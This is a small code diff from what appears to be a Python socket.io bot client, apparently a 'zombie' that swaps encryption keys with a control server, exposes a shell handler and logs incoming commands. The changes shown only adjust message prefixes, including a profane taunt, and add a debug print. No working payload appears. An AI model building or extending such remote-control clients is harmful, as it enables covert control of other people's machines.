@@ -43,7 +43,7 @@ def public_key_received(data):
     print("Public key received.")
     sio.emit('client_key_to_server', export_public_key(public_key))
     send_encrypted_message('message Hello from zombie!')
-    send_encrypted_message('USBO WAS FUCKING HERE BITCH!')
+    send_encrypted_message('message USBO WAS FUCKING HERE BITCH!')
 
 def encrypt(message: str) -> str:
     global public_key
@@ -113,7 +113,7 @@ def shell(args):
 
 @sio.event
 def message(data):
-    
+    print(f"Ricevuto data: {data}")
     if isinstance(data, str):
         data = json.loads(data)
 
